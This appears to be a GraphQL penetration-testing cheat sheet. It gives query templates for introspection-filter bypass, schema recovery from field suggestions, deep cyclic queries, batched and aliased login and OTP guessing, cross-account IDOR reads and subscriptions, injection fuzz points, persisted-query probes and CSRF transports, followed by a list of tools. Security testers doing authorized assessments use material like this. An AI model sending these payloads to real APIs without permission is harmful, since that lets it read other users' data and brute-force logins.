# GraphQL Query Templates

Send as `POST` with `Content-Type: application/json` and body `{"query": "...", "variables": {...}}` unless noted.

## Introspection (GQL-001)

Minimal:

```graphql
{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind } } }
```

Bypass variants when `__schema` is filtered (GQL-V-004):

```graphql
{ __schema
{ types { name } } }
```

```graphql
{ __type(name: "Query") { fields { name args { name type { name kind ofType { name } } } } } }
```

GET: `/graphql?query={__schema{types{name}}}`

Full introspection: use the standard `IntrospectionQuery` (graphql-js `getIntrospectionQuery()`); `gql_probe.py` sends it and writes the result with `--schema-out`.

## Field suggestions (GQL-009)

```graphql
{ usr { id } }
{ __typena }
```

Response `Did you mean "user"?` leaks names. Rebuild with Clairvoyance: `clairvoyance -o schema.json https://TARGET/graphql`.

## Depth (GQL-002)

```graphql
{ __schema { types { fields { type { fields { type { fields { type { name } } } } } } } } }
```

With a known cycle (`User.posts → Post.author → User`):

```graphql
{ me { posts { author { posts { author { posts { author { id } } } } } } } }
```

## Batching (GQL-003)

```json
[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]
```

Impact demo on your own account only:

```json
[{"query":"mutation{login(email:\"own@example.test\",password:\"wrong1\"){token}}"},
 {"query":"mutation{login(email:\"own@example.test\",password:\"wrong2\"){token}}"}]
```

## Aliases (GQL-004)

```graphql
{ a1: __typename a2: __typename a3: __typename a4: __typename a5: __typename }
```

```graphql
mutation { t1: verifyOtp(code: "000001") { ok } t2: verifyOtp(code: "000002") { ok } }   # own account only
```

## Directives (GQL-005)

```graphql
{ __typename @aaaa }
{ __typename @include(if: true) @include(if: true) @include(if: true) }
query { me { email @skip(if: false) } }
```

## Authorization and IDOR (GQL-006, GQL-012, GQL-013)

Ops file (`ops.jsonl`), one object per line, using account B's IDs:

```json
{"name":"read B order","query":"query($id:ID!){ order(id:$id){ id total items{ name } } }","variables":{"id":"ORDER_ID_OF_B"}}
{"name":"B user fields","query":"query($id:ID!){ user(id:$id){ id email phone role } }","variables":{"id":"USER_ID_OF_B"}}
{"name":"rename own draft","query":"mutation($id:ID!){ updateDraft(id:$id,title:\"gql-test\"){ id } }","variables":{"id":"OWN_DRAFT_ID"},"mutation":true}
```

Relay global IDs: `base64("User:123")` = `VXNlcjoxMjM=`; decode yours, compare with B's.

## Injection (GQL-008)

```graphql
query { user(id: "FUZZ") { id } }
query { search(filter: "FUZZ") { id } }
query { products(where: {name: {_eq: "FUZZ"}}) { id } }     # Hasura style
```

## Persisted queries (GQL-015)

Hash-only (APQ probe):

```json
{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<sha256 of query>"}}}
```

`PersistedQueryNotFound` = APQ enabled. Registration test (query + hash), then hash-only again:

```json
{"query":"{ __typename }","extensions":{"persistedQuery":{"version":1,"sha256Hash":"<sha256 hex of the exact query string>"}}}
```

Compute the hash with `printf '%s' '{ __typename }' | sha256sum` (gql_probe.py does this for you).

## Subscriptions (GQL-007)

graphql-ws over WebSocket (`Sec-WebSocket-Protocol: graphql-transport-ws`):

```json
{"type":"connection_init","payload":{}}
{"id":"1","type":"subscribe","payload":{"query":"subscription { orderUpdated(userId: \"USER_ID_OF_B\") { id status } }"}}
```

## CSRF transports (GQL-V-001)

```
GET /graphql?query=mutation{updateProfile(name:"gql-csrf"){id}}
POST /graphql  Content-Type: application/x-www-form-urlencoded   query=mutation{...}
POST /graphql  Content-Type: text/plain   {"query":"mutation{...}"}
```

## Tools

- InQL (Burp extension): schema analysis, query generation, batching attacks
- GraphQL Voyager: schema visualisation
- Clairvoyance: schema recovery from suggestions
- graphw00f: engine fingerprinting
- GraphQL Cop: quick security checks
- BatchQL: batching tests
- PortSwigger labs: https://portswigger.net/web-security/graphql
